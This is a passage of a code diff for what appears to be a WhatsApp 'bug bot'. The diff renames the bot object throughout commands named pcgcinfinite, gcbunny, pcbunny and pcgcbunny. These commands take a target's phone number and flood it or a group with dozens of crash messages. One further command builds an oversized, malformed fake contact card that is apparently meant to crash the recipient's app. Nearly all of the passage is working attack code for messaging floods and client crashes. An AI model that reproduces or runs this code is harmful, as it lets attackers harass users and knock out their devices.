+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
             reply(mess.success)
             break
                    case 'pcgcfast':               
@@ -7921,60 +7899,60 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcinfinite 91xxxxxx
                         } 
                     } 
                 }
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
             break
 case 'gcbunny': {            
            	
@@ -8012,11 +7990,11 @@ case 'gcbunny': {
                         } 
                     } 
                 }
-            await ElgazarBot.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
-            await ElgazarBot.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
-            await ElgazarBot.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
-            await ElgazarBot.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
-            await ElgazarBot.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
+            await Elza3emgonBot.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
+            await Elza3emgonBot.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
+            await Elza3emgonBot.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
+            await Elza3emgonBot.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
+            await Elza3emgonBot.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
             }
             break
           case 'pcbunny': { 
@@ -8055,15 +8033,15 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcbunny 91xxxxxxxxxx`
                         } 
                     } 
                 }
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
             await sleep(30000)
             }
             break 
@@ -8105,25 +8083,25 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcbunny 91xxxxxxxxx
                         } 
                     } 
                 }
-            await ElgazarBot.sendMessage(m.chat, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
+            await Elza3emgonBot.sendMessage(m.chat, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
+            await Elza3emgonBot.sendMessage(m.chat, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
+            await Elza3emgonBot.sendMessage(m.chat, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
+            await Elza3emgonBot.sendMessage(m.chat, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
             await sleep(30000)
-            await ElgazarBot.sendMessage(m.chat, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
+            await Elza3emgonBot.sendMessage(m.chat, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
             await sleep(30000)
-            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
+            await Elza3emgonBot.sendMessage(`${text}@s.whatsapp.net`, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
             await sleep(30000)
             }
             break
@@ -8134,7 +8112,7 @@ if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${pre
 amount = `${encodeURI(q)}`
 for (let i = 0; i < amount; i++) {
 kwkwkx = '``🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot``',
-ElgazarBot.sendMessage(m.chat, {text: kwkwkx, thumbnail: xpicvirus, quoted: m, contextInfo: { externalAdReply:{title: `${xeonvirtex}`,body: 'Xeon Ezy☣️',previewType:"PHOTO",thumbnail: xpicvirus,sourceUrl:websitex}}})
+Elza3emgonBot.sendMessage(m.chat, {text: kwkwkx, thumbnail: xpicvirus, quoted: m, contextInfo: { externalAdReply:{title: `${xeonvirtex}`,body: 'Xeon Ezy☣️',previewType:"PHOTO",thumbnail: xpicvirus,sourceUrl:websitex}}})
 }
 }
 break
@@ -8145,7 +8123,7 @@ if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${pre
 amount = `${encodeURI(q)}`
 for (let i = 0; i < amount; i++) {
 const fakeContacts = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot ${xeonbrutal(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:Xeon Ezy☣️\nitem1.TEL:+916909137213\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 